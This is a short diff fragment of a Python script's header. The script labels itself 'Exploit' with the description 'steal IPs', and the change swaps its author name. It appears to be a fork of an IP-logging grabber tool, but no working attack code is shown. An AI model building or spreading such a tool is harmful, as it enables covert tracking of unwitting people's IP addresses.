@@ -13,7 +13,7 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Exploit"
 __description__ = "steal IPs"
 __version__ = "v6.0"
-__author__ = "Termoyadernyy"
+__author__ = "robberinhood"
 
 config = {
     # BASE CONFIG #
